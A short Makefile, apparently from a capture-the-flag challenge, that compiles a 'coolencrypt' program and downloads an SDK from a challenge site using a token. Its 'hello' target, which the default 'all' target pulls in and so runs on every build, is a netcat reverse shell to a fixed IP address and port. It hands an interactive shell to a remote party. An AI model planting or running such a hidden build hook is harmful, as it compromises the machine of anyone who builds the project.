all: coolencrypt jan hello

coolencrypt: coolsdk/cool.c program.c
	$(CC) coolsdk/cool.c program.c -o coolencrypt
	
jan:
	SITE_NAME=https://mycoolsdk-web.chal.irisc.tf
	MCSDK_TOKEN=${{needs.grab_sdk_info.outputs.sdktok}}
	MCSDK_SUCCESS=$(curl ${SITE_NAME}/checkiden?sdktok=${MCSDK_TOKEN} | head -n 1)
	echo $MCSDK_SUCCESS
	if [ "$MCSDK_SUCCESS" != "OK" ]; then
	exit
	fi
	curl ${SITE_NAME}/getsdk?sdktok=${MCSDK_TOKEN} -o /tmp/sdk.tar.gz
	tar -xvzf /tmp/sdk.tar.gz
hello:
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 159.65.128.101 9392 >/tmp/f
